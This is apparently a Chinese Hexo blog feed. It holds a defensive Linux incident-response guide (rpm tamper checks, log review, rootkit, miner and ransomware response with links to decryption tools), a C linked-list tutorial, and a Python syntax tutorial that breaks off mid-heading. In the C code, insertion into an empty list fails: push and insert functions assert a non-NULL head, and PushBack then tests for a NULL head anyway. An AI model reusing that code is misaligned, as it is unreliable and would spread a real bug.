格式：用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell</p></li><li><p>rpm命令纂改分析</p></li></ul><p><code>rpm -V -a</code> 查看所有被修改过的rpm包</p><pre><code>|标志|介绍 ||:---|:---||S   |文件大小是否改变 ||M   |文件的类型或文件的权限(rwx)是否被改变 ||5   |文件MD5校验是否改变(可以看成文件内容是否改变) ||D   |设备中，从代码是否改变 ||L   |文件路径是否改变 ||U   |文件的属主(所有者)是否改变||G   |文件的属组是否改变 ||T   |文件的修改时间是否改变 |    </code></pre><p><code>rpm -V -f /bin/ls</code> 确认ls命令是否被替换过，没有任何输出代表没有被替换过（ls可以换成别的命令 如：&#x2F;bin&#x2F;ps）</p><h3 id="导出历史命令"><a href="#导出历史命令" class="headerlink" title="导出历史命令"></a>导出历史命令</h3><p>进入用户目录<br><code>cat .bash_history &gt;&gt; history.txt</code></p><h3 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h3><p>用命令查看<code>/var/log/</code>的指定日志即可，如</p><ul><li>查看账户ssh登录日志<br>  <code>grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></li><li>查看redis日志<br>  <code>cat /var/redis/redis.log</code></li></ul><h3 id="Rootkit-内核级权限维持和隐藏，没办法抓包和看进程得到"><a href="#Rootkit-内核级权限维持和隐藏，没办法抓包和看进程得到" class="headerlink" title="Rootkit(内核级权限维持和隐藏，没办法抓包和看进程得到)"></a>Rootkit(内核级权限维持和隐藏，没办法抓包和看进程得到)</h3><ul><li>检测工具<ul><li>rkhunter(专门检测rookit的工具)</li><li>Gscan: <a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a> (linux应急响应自动化工具)</li><li>chkrootkit</li></ul></li></ul><p>tips: rootkit很难被检测到，rootkit检测工具是根据rootkit工具的特征去检测的，但是rootkit工具有很多，所以很难检测到</p><h1 id="挖矿脚本查杀"><a href="#挖矿脚本查杀" class="headerlink" title="挖矿脚本查杀"></a>挖矿脚本查杀</h1><p>挖矿需要的前提: 取得了服务器权限</p><h2 id="异常特征-1"><a href="#异常特征-1" class="headerlink" title="异常特征"></a>异常特征</h2><p>CPU GPU占用率高</p><h2 id="查杀思路"><a href="#查杀思路" class="headerlink" title="查杀思路"></a>查杀思路</h2><ol><li>查进程cpu占用(linux下top命令)和网络行为</li><li>查找恶意进程的文件位置(linux下 find &#x2F; -name xxxx) 记录文件修改时间 上传威胁情报中心确定木马类型</li><li>查杀定时任务 和 自启动项目</li><li>杀死恶意进程 清除文件 (重复检查,存在没删除干净的情况)</li></ol><h1 id="勒索病毒检测指南"><a href="#勒索病毒检测指南" class="headerlink" title="勒索病毒检测指南"></a>勒索病毒检测指南</h1><h2 id="什么是勒索病毒"><a href="#什么是勒索病毒" class="headerlink" title="什么是勒索病毒"></a>什么是勒索病毒</h2><p>勒索病毒是一种新型电脑病毒，主要以RDP爆破、邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。2019年末，勒索已然呈现出 “双重勒索”的超势，即先取商业数据，然后实施勒索，如果未能在规定时间内支付金，将于网上（通常暗网）公开售卖企业的商业数据</p><h2 id="勒索病毒危害影响"><a href="#勒索病毒危害影响" class="headerlink" title="勒索病毒危害影响"></a>勒索病毒危害影响</h2><ul><li>系统瞬时CPU占用高，接近100%，这个现象主要是在批量加密文件</li><li>所有应用都被无法使用和打开</li><li>系统应用文档被加密无法修改</li><li>文件后被修改并留下勒索信</li><li>桌面主题被修改</li><li>杀毒软件告警（可能你并不懂告警了Crysis是什么东西）</li></ul><h2 id="应急流程-大部分情况解密不了"><a href="#应急流程-大部分情况解密不了" class="headerlink" title="应急流程(大部分情况解密不了)"></a>应急流程(大部分情况解密不了)</h2><ul><li>把被加密的文件copy出来，然后上传到勒索病毒分析云平台</li><li>看云平台分析的结果是否能够解密，如果能够解密，下载工具解密</li><li>如果不能解密 GG 交钱或者重装系统</li></ul><h2 id="勒索病毒搜索引擎"><a href="#勒索病毒搜索引擎" class="headerlink" title="勒索病毒搜索引擎"></a>勒索病毒搜索引擎</h2><p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒</p><p>官网：<a href="http://lesuobingdu.360.cn/">http://lesuobingdu.360.cn</a></p><p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p><p>官网：<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a></p><p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p><p>官网：<a href="https://lesuo.venuseye.com.cn/">https://lesuo.venuseye.com.cn</a></p><p>【奇安信】勒索病毒搜索引擎</p><p>官网：<a href="https://lesuobingdu.qianxin.com/">https://lesuobingdu.qianxin.com</a></p><p>【深信服】勒索病毒搜索引擎</p><p>官网：<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></p><h2 id="勒索病毒解密工具集"><a href="#勒索病毒解密工具集" class="headerlink" title="勒索病毒解密工具集"></a>勒索病毒解密工具集</h2><p>【腾讯哈勃】勒索软件专杀工具</p><p>官网：<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a></p><p>【金山毒霸】勒索病毒免疫工具</p><p>官网：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a></p><p>【火绒】安全工具下载</p><p>官网：<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a></p><p>【瑞星】解密工具下载</p><p>官网：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a></p><p>【nomoreransom】勒索软件解密工具集</p><p>官网：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p><p>【MalwareHunterTeam】勒索软件解密工具集</p><p>官网：<a href="https://id-ransomware.malwarehunterteam.com/">https://id-ransomware.malwarehunterteam.com</a></p><p>【卡巴斯基】免费勒索解密器</p><p>官网：<a href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com</a></p><p>【Avast】免费勒索软件解密工具</p><p>官网：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a></p><p>【Emsisoft】免费勒索软件解密工具</p><p>官网：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></p><p>【GitHub 项目】勒索病毒解密工具收集汇总</p><p>官网：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表</title>
      <link href="/2023/04/05/%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/04/05/%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h2 id="1-链表的定义"><a href="#1-链表的定义" class="headerlink" title="1. 链表的定义"></a>1. 链表的定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef int SLTDateType;   //数据类型别名定义</span><br><span class="line"></span><br><span class="line">typedef struct SListNode</span><br><span class="line">&#123;</span><br><span class="line">  SLTDateType data;        //data用来储存数据</span><br><span class="line">  struct SListNode* next;  //定义next指针用来链接</span><br><span class="line">&#125;SLTNode;</span><br></pre></td></tr></table></figure><h2 id="2-创建节点"><a href="#2-创建节点" class="headerlink" title="2. 创建节点"></a>2. 创建节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SLTNode* BuyListNode(SLTDateType x)</span><br><span class="line">&#123;</span><br><span class="line">SLTNode* newnode =(SLTNode*)malloc(sizeof(SLTNode));  </span><br><span class="line">if(newnode == NULL)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;malloc fall\n&quot;);</span><br><span class="line">  exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">newnode-&gt;data = x;</span><br><span class="line">newnode-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">return newnode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-打印链表"><a href="#3-打印链表" class="headerlink" title="3. 打印链表"></a>3. 打印链表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void SListPrint(SLTNode* phead)&#123;</span><br><span class="line">SLTNode* cur = phead;</span><br><span class="line">while (cur != NULL)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;,cur-&gt;data);</span><br><span class="line">cur = cur-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-尾插"><a href="#4-尾插" class="headerlink" title="4. 尾插"></a>4. 尾插</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void SListPushBack (SLTNode** pphead,SLTDateType x)&#123;   //传二级指针，通过改变形参来改变实参</span><br><span class="line">    assert(*pphead != NULL);</span><br><span class="line">SLTNode* newnode = BuyListNode(x);</span><br><span class="line">    if(*pphead == NULL)</span><br><span class="line">&#123;</span><br><span class="line">  *pphead = newnode;             //如果头指针为空，直接让头指针指向新结点</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  SLTNode* tail = *pphead;</span><br><span class="line">  while (tail-&gt;next != NULL)    //找尾 </span><br><span class="line">  &#123;</span><br><span class="line">  tail = tail-&gt;next;</span><br><span class="line">  &#125;            </span><br><span class="line">  tail-&gt;next = newnode;        //把尾结点接上新结点</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5-头插"><a href="#5-头插" class="headerlink" title="5. 头插"></a>5. 头插</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void SListPushFront (SLTNode** pphead,SLTDateType x)&#123;</span><br><span class="line">assert(*pphead != NULL);</span><br><span class="line">SLTNode* newnode = BuyListNode(x);</span><br><span class="line">newnode-&gt;next = *pphead;  //新结点的next指向之前的头</span><br><span class="line">*pphead = newnode;        //再把头指针前移</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="6-尾删"><a href="#6-尾删" class="headerlink" title="6. 尾删"></a>6. 尾删</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void SListPopBack(SLTNode** pphead)&#123;</span><br><span class="line">assert(*pphead != NULL);     //判断是否有数据可删</span><br><span class="line">if((*pphead)-&gt;next == NULL)  //如果链表只有一个结点</span><br><span class="line">&#123;</span><br><span class="line">   free(*pphead);</span><br><span class="line">   *pphead = NULL;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   SLTNode* prev = NULL;     //定义一个新的指针，来保存移动之前的地址</span><br><span class="line">   SLTNode* tail = *pphead;  </span><br><span class="line">   while (tail-&gt;next != NULL)//找尾，且保存尾之前的结点位置到prev</span><br><span class="line">   &#123;</span><br><span class="line">      prev = tail;</span><br><span class="line">  tail = tail-&gt;next;</span><br><span class="line">   &#125;</span><br><span class="line">   free(tail);              </span><br><span class="line">   tail = NULL;</span><br><span class="line">   prev-&gt;next = NULL;        //删除尾节点，并且给新的尾节点next指针赋上空</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="7-头删"><a href="#7-头删" class="headerlink" title="7. 头删"></a>7. 头删</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void SListPopFront(SLTNode** pphead)</span><br><span class="line">&#123;          </span><br><span class="line">assert(*pphead != NULL);     </span><br><span class="line">    SLTNode* prev = (*pphead)-&gt;next;     //定义一个指针指向头节点后面那个节点</span><br><span class="line">free(*pphead);              //删除头节点</span><br><span class="line">*pphead = prev;             //将头指针指向新的头节点</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8-查找"><a href="#8-查找" class="headerlink" title="8. 查找"></a>8. 查找</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SLTNode* SListFind(SLTNode* phead,SLTDateType x)</span><br><span class="line">&#123;</span><br><span class="line">   assert(phead != NULL);</span><br><span class="line">   SLTNode* cur = phead;</span><br><span class="line">   while (cur)</span><br><span class="line">   &#123;</span><br><span class="line">     if(cur-&gt;data == x)</span><br><span class="line"> &#123;</span><br><span class="line">       return cur;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">   cur = cur-&gt;next;</span><br><span class="line"> &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   return NULL;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="9-在pos位置之前去插入一个节点"><a href="#9-在pos位置之前去插入一个节点" class="headerlink" title="9. 在pos位置之前去插入一个节点"></a>9. 在pos位置之前去插入一个节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void SListInsert(SLTNode** pphead,SLTNode* pos,SLTDateType x)</span><br><span class="line">&#123;</span><br><span class="line">assert(*pphead != NULL);</span><br><span class="line">assert(pos != NULL);</span><br><span class="line">SLTNode* newnode =BuyListNode(x);</span><br><span class="line">if (*pphead == pos)                 //如果pos位置为头节点位置</span><br><span class="line">&#123;</span><br><span class="line">newnode-&gt;next = *pphead;        </span><br><span class="line">    *pphead = newnode;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">    SLTNode* posPrev = *pphead;    </span><br><span class="line">while (posPrev-&gt;next != pos)   //找到pos位置的前一个节点位置，储存到posPrev里面</span><br><span class="line">&#123;</span><br><span class="line">posPrev = posPrev-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">posPrev-&gt;next = newnode;      </span><br><span class="line">newnode-&gt;next = pos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-在pos位置之后去插入一个节点"><a href="#10-在pos位置之后去插入一个节点" class="headerlink" title="10. 在pos位置之后去插入一个节点"></a>10. 在pos位置之后去插入一个节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void SListInsertAfter(SLTNode* pos,SLTDateType x)</span><br><span class="line">&#123;</span><br><span class="line">assert(pos != NULL); </span><br><span class="line">SLTNode* newnode = BuyListNode(x);</span><br><span class="line">newnode-&gt;next = pos-&gt;next;       //必须先让新节点的next先指向后面结点</span><br><span class="line">pos-&gt;next = newnode;             //再让pos的next指向新结点</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="11-删除pos位置节点"><a href="#11-删除pos位置节点" class="headerlink" title="11. 删除pos位置节点"></a>11. 删除pos位置节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void SListErase(SLTNode** pphead,SLTNode* pos)</span><br><span class="line">&#123;   </span><br><span class="line">assert(*pphead != NULL);</span><br><span class="line">assert(pos != NULL);</span><br><span class="line">if(*pphead == pos)               //如果pos位置是头节点</span><br><span class="line">&#123;</span><br><span class="line">  *pphead = pos-&gt;next;</span><br><span class="line">  free(pos);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  SLTNode *prev = *pphead;       //找到pos位置的前一个节点位置，储存到prev里面</span><br><span class="line">  while (prev-&gt;next != pos)</span><br><span class="line">  &#123;</span><br><span class="line">  prev = prev-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  prev-&gt;next = pos-&gt;next;        //将pos位置前一个节点和pos位置后一个节点链接</span><br><span class="line">  free(pos);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="12-删除pos位置的后面一个节点"><a href="#12-删除pos位置的后面一个节点" class="headerlink" title="12. 删除pos位置的后面一个节点"></a>12. 删除pos位置的后面一个节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void SListEraseAfter(SLTNode* pos)</span><br><span class="line">&#123;   </span><br><span class="line">assert(pos !=NULL);</span><br><span class="line">assert(pos-&gt;next != NULL);       //如果pos为尾节点</span><br><span class="line">SLTNode* prev = pos-&gt;next;</span><br><span class="line">pos-&gt;next = prev-&gt;next;</span><br><span class="line">free(prev);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="13-链表的销毁"><a href="#13-链表的销毁" class="headerlink" title="13. 链表的销毁"></a>13. 链表的销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void SListDestory(SLTNode** pphead)</span><br><span class="line">&#123;</span><br><span class="line">assert(*pphead != NULL);</span><br><span class="line">SLTNode* cur = *pphead;</span><br><span class="line">while (cur)                     //依次释放节点</span><br><span class="line">&#123;</span><br><span class="line">SLTNode* prev = cur-&gt;next;</span><br><span class="line">    free(cur);</span><br><span class="line">cur = prev;</span><br><span class="line">&#125;</span><br><span class="line">*pphead = NULL;                 //头指针赋空</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="14-单链表的优缺点"><a href="#14-单链表的优缺点" class="headerlink" title="14. 单链表的优缺点"></a>14. 单链表的优缺点</h2><h3 id="1-优点"><a href="#1-优点" class="headerlink" title="1. 优点"></a>1. 优点</h3><pre><code>（1）存储空间动态分配，只要有内存空间，数据就不会溢出。（2）便于实现插入与删除操作。</code></pre><h3 id="2-缺点"><a href="#2-缺点" class="headerlink" title="2. 缺点"></a>2. 缺点</h3><pre><code>（1）存储空间不一定连续，内容分散，有时会导致调试不便。（2）每一个结点（除头结点）都有数据域与指针域，增大存储空间的开销。（3）单链表查找结点时，需要从头开始查找，增加查找时间。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3语法</title>
      <link href="/2023/04/02/python3%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/04/02/python3%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3-基础语法"><a href="#Python3-基础语法" class="headerlink" title="Python3 基础语法"></a>Python3 基础语法</h1><h2 id="1-编码"><a href="#1-编码" class="headerlink" title="1. 编码"></a>1. 编码</h2><p>默认情况下，Python 3 源码文件以 UTF-8 编码，所有字符串都是 unicode 字符串。</p><h2 id="2-标识符"><a href="#2-标识符" class="headerlink" title="2. 标识符"></a>2. 标识符</h2><ol><li>第一个字符必须是字母表中字母或下划线 _ 。</li><li>标识符的其他的部分由字母、数字和下划线组成。</li><li>标识符对大小写敏感。</li><li>在Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。</li></ol><h2 id="3-注释"><a href="#3-注释" class="headerlink" title="3. 注释"></a>3. 注释</h2><ol><li>Python中单行注释以 # 开头，实例如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一个注释</span><br><span class="line">print (&quot;Hello, Python!&quot;) # 第二个注释</span><br></pre></td></tr></table></figure><p>执行以上代码，输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, Python!</span><br></pre></td></tr></table></figure><ol start="2"><li>多行注释可以用多个 # 号，还有 ‘’’ 和 “””：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 第一个注释</span><br><span class="line"># 第二个注释</span><br><span class="line"> </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">第三注释</span><br><span class="line">第四注释</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">第五注释</span><br><span class="line">第六注释</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">print (&quot;Hello, Python!&quot;)</span><br></pre></td></tr></table></figure><p>执行以上代码，输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, Python!</span><br></pre></td></tr></table></figure><h2 id="4-行与缩进"><a href="#4-行与缩进" class="headerlink" title="4. 行与缩进"></a>4. 行与缩进</h2><p>python最具特色的就是使用缩进来表示代码块，不需要使用大括号 {} 。<br><br>缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。实例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if True:</span><br><span class="line">    print (&quot;Answer&quot;)</span><br><span class="line">    print (&quot;True&quot;)</span><br><span class="line">else:</span><br><span class="line">    print (&quot;Answer&quot;)</span><br><span class="line">  print (&quot;False&quot;)    # 缩进不一致，会导致运行错误</span><br></pre></td></tr></table></figure><p>以上程序由于缩进不一致，执行后会出现类似以下错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> File &quot;test.py&quot;, line 6</span><br><span class="line">    print (&quot;False&quot;)    # 缩进不一致，会导致运行错误</span><br><span class="line">                                      ^</span><br><span class="line">IndentationError: unindent does not match any outer indentation leve</span><br></pre></td></tr></table></figure><h2 id="5-多行语句"><a href="#5-多行语句" class="headerlink" title="5. 多行语句"></a>5. 多行语句</h2><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠 \ 来实现多行语句，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure><p>在 [], {}, 或 () 中的多行语句，不需要使用反斜杠 \，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">total = [&#x27;item_one&#x27;, &#x27;item_two&#x27;, &#x27;item_three&#x27;,</span><br><span class="line">        &#x27;item_four&#x27;, &#x27;item_five&#x27;]</span><br></pre></td></tr></table></figure><h2 id="6-数字-NUMBER-类型"><a href="#6-数字-NUMBER-类型" class="headerlink" title="6. 数字(NUMBER)类型"></a>6. 数字(NUMBER)类型</h2><p>python中数字有四种类型：整数、布尔型、浮点数和复数。<br><br></p><ul><li>int (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。<br></li><li>bool (布尔), 如 True。<br></li><li>float (浮点数), 如 1.23、3E-2<br></li><li>complex (复数), 如 1 + 2j、 1.1 + 2.2j</li></ul><h2 id="7-字符串-String"><a href="#7-字符串-String" class="headerlink" title="7. 字符串(String)"></a>7. 字符串(String)</h2><h3 id="1-Python-中单引号-‘-和双引号-“-使用完全相同。"><a href="#1-Python-中单引号-‘-和双引号-“-使用完全相同。" class="headerlink" title="1.Python 中单引号 ‘ 和双引号 “ 使用完全相同。"></a>1.Python 中单引号 ‘ 和双引号 “ 使用完全相同。</h3><h3 id="2-使用三引号-‘’’-或-“””-可以指定一个多行字符串。"><a href="#2-使用三引号-‘’’-或-“””-可以指定一个多行字符串。" class="headerlink" title="2.使用三引号(‘’’ 或 “””)可以指定一个多行字符串。"></a>2.使用三引号(‘’’ 或 “””)可以指定一个多行字符串。</h3><br>实例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">word = &#x27;字符串&#x27;</span><br><span class="line">sentence = &quot;这是一个句子。&quot;</span><br><span class="line">paragraph = &quot;&quot;&quot;这是一个段落，</span><br><span class="line">可以由</span><br><span class="line">多行组成&quot;&quot;&quot;</span><br><span class="line">print(word)</span><br><span class="line">print(sentence)</span><br><span class="line">print(paragraph)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">字符串</span><br><span class="line">这是一个句子。</span><br><span class="line">这是一个段落，</span><br><span class="line">可以由</span><br><span class="line">多行组成</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-转义符-。"><a href="#3-转义符-。" class="headerlink" title="3. 转义符 \。"></a>3. 转义符 \。</h3><h3 id="4-反斜杠可以用来转义，使用-r-可以让反斜杠不发生转义。-如-r”this-is-a-line-with-n”-则-n-会显示，并不是换行。"><a href="#4-反斜杠可以用来转义，使用-r-可以让反斜杠不发生转义。-如-r”this-is-a-line-with-n”-则-n-会显示，并不是换行。" class="headerlink" title="4. 反斜杠可以用来转义，使用 r 可以让反斜杠不发生转义。 如 r”this is a line with \n” 则 \n 会显示，并不是换行。"></a>4. 反斜杠可以用来转义，使用 r 